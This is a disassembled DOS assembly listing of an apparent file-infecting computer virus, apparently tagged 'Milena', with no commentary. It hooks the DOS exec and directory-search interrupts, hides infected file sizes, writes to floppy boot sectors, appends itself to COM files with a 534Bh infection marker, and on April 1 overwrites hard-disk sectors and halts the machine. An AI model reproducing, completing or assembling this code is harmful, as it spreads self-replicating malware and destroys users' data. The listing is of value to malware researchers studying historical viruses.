﻿

	PAGE	60,132
;
XSEG	SEGMENT
;	Seg=01387H
;	Org=00000H
	ASSUME CS:XSEG
XPROC	PROC FAR
	JMP	L6551
	DEC	BX
	PUSH	BX
	PUSH	CX
	CALL	L0009
L0009:	POP	SI
	SUB	SI,+09H
	PUSH	SI
	CLD
	MOV	DI,0100H
	MOV	CX,0005H
	MOVSB
	JMP	L01CE
L001A:	PUSHF
	PUSH	CS
	CALL	WORD PTR CS:[08C0H]
	DB	0C3H; RET  
	STI
	CMP	AH,4BH
	JE	L0061
	CMP	AH,11H
	JE	L0035
	CMP	AH,12H
	JE	L0035
	JMP	L01C0
L0035:	CALL	L001A
	PUSH	AX
	PUSH	BX
	PUSH	ES
	MOV	AH,2FH
	CALL	L001A
	MOV	AX,534BH
	CMP	ES:[BX+1EH],AX
	JNE	L0050
	MOV	AX,0254H
	SUB	ES:[BX+24H],AX
L0050:	POP	ES
	POP	BX
	POP	AX
	RET	0002H; 0CAH
L0056:	MOV	BX,0F200H
	MOV	CX,0001H
	MOV	DH,00H
	INT	13H
	DB	0C3H; RET  
L0061:	PUSHF
	PUSH	SS
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	XOR	AX,AX
	MOV	DS,AX
	MOV	DI,DS:[0194H]
	MOV	ES,DS:[0196H]
	MOV	AX,WORD PTR DS:[004CH]
	MOV	BX,DS:[004EH]
	MOV	CX,0F000H
	MOV	DX,0EC59H
	MOV	DS:[0100H],DX
	MOV	DS:[0102H],CX
	MOV	WORD PTR DS:[0198H],AX
	MOV	DS:[019AH],BX
	MOV	DS:[004CH],DI
	MOV	DS:[004EH],ES
	PUSH	CS
	POP	DS
	PUSH	CS
	POP	ES
	MOV	AH,19H
	CALL	L001A
	CMP	AL,01H
	JNBE	L00BB
	MOV	DL,AL
	MOV	AX,0201H
	CALL	L0056
	MOV	AX,0301H
	CALL	L0056
	CMP	AH,00H
	JNE	L00D0
L00BB:	MOV	AH,2AH
	CALL	L001A
	CMP	DX,0401H
	JNE	L00D3
	MOV	AX,030FH
	MOV	DL,80H
	CALL	L0056
	CLI
	HLT
L00D0:	JMP	L01A4
L00D3:	MOV	AH,2FH
	CALL	L001A
	MOV	CS:[08B0H],ES
	MOV	CS:[08B2H],BX
	MOV	AH,4EH
	MOV	DX,0BD5H
	MOV	CX,0000H
	CALL	L001A
	JB	L00D0
L00EF:	MOV	AX,534BH
	CMP	ES:[BX+16H],AX
	JNE	L0101
L00F8:	MOV	AH,4FH
	CALL	L001A
	JB	L00D0
	JMP	SHORT L00EF
L0101:	MOV	CX,05DCH
	CMP	ES:[BX+1AH],CX
	JBE	L00F8
	PUSH	ES
	POP	DS
	MOV	AX,3D02H
	MOV	DX,BX
	ADD	DX,+1EH
	CALL	L001A
	MOV	WORD PTR CS:[0C65H],AX
	MOV	BX,AX
	PUSH	CS
	POP	DS
	MOV	AH,3FH
	MOV	DX,0A10H
	MOV	CX,0005H
	CALL	L001A
	MOV	DX,5A4DH
	CMP	DS:[0A10H],DX
	JE	L019A
	MOV	DI,0C67H
	MOV	AL,0E9H
	MOV	[DI],AL
	INC	DI
	MOV	BX,DS:[08B2H]
	MOV	CX,ES:[BX+1AH]
	INC	CX
	INC	CX
	MOV	[DI],CX
	INC	DI
	INC	DI
	MOV	AX,534BH
	MOV	[DI],AX
	MOV	BX,CS:[0C65H]
	MOV	AX,4200H
	XOR	CX,CX
	XOR	DX,DX
	CALL	L001A
	MOV	AH,40H
	MOV	DX,0C67H
	MOV	CX,0005H
	CALL	L001A
	MOV	AX,4202H
	XOR	CX,CX
	XOR	DX,DX
	CALL	L001A
	PUSH	CS
	POP	DS
	MOV	BX,CS:[0C65H]
	MOV	AH,40H
	MOV	DX,0A10H
	MOV	CX,0254H
	CALL	L001A
	JB	L019A
	MOV	BX,CS:[0C65H]
	MOV	AX,5700H
	CALL	L001A
	MOV	AX,5701H
	MOV	CX,534BH
	CALL	L001A
L019A:
	MOV	BX,CS:[0C65H]
	MOV	AH,3EH
	CALL	L001A
L01A4:	XOR	AX,AX
	MOV	DS,AX
	MOV	AX,WORD PTR DS:[0198H]
	MOV	BX,DS:[019AH]
	MOV	WORD PTR DS:[004CH],AX
	MOV	DS:[004EH],BX
	POP	DI
	POP	SI
	POP	ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	POP	SS
	POPF
L01C0:
	JMP	WORD PTR CS:[08C0H]
	SUB	CH,DS:[6F63H]
	DB	6DH
	ADD	[BX+SI+0CF03H],DH
L01CE:	MOV	AX,0070H
	MOV	ES,AX
	MOV	DI,0000H
	MOV	AX,80FBH
L01D9:	CLD
	MOV	CX,0FFFFH
	SCASW
	JE	L01E6
	MOV	DI,0001H
	JMP	SHORT L01D9
L01E6:	MOV	BX,02FCH
	CMP	ES:[DI],BX
	JNE	L01DD
	DEC	DI
	DEC	DI
	XOR	AX,AX
	MOV	DS,AX
	MOV	DS:[0194H],DI
	MOV	DS:[0196H],ES
	MOV	ES,DS:[009EH]
	MOV	BX,DS:[00A0H]
	PUSH	CS
	POP	DS
	MOV	DX,BP
	MOV	BP,DS
	POP	SI
	PUSH	SI
	MOV	DI,0A10H
	MOV	CX,0255H
	MOVSB
	PUSH	ES
	LEA	DI,[BX+1BH]
	MOV	AL,0E9H
	STOSB
	MOV	AX,0A30H
	SUB	AX,DI
	STOSW
	MOV	AX,9090H
	STOSW
	STOSW
	MOV	ES:[08C0H],DI
	MOV	AX,SS
	SUB	AX,0018H
	CLI
	MOV	SS,AX
	PUSH	CS
	POP	SS
	STI
	MOV	DS,BP
	MOV	BP,DX
	POP	ES
	PUSH	CS
	POP	ES
	POP	SI
	POP	CX
	XOR	DX,DX
	XOR	SI,SI
	XOR	AX,AX
	XOR	BX,BX
	MOV	DI,0100H
	JMP	DI
	DEC	BP
	DB	69H
	DB	6CH
	DB	65H
	DB	6EH
	DB	61H
	AND	[BP+DI+02H],CL
XPROC	ENDP
XSEG	ENDS
	END

